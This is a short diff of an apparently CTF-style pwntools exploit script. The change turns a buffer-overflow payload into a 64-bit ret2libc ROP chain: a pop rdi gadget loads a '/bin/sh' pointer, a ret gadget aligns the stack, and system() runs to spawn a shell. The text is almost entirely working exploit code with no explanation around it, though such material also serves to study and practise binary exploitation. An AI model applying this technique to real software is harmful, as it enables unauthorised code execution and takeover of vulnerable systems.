@@ -44,11 +44,14 @@ binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
 
+pop_rdi = 0x0000555555555213
+
 payload = b'A'*0x20
 payload += b'B'*0x8
-payload += p64(system_addr)
-payload += b'C'*0x8
+payload += p64(pop_rdi)
 payload += p64(binsh)
+payload += p64(pop_rdi+1)
+payload += p64(system_addr)
 
 p.sendline(payload)
 
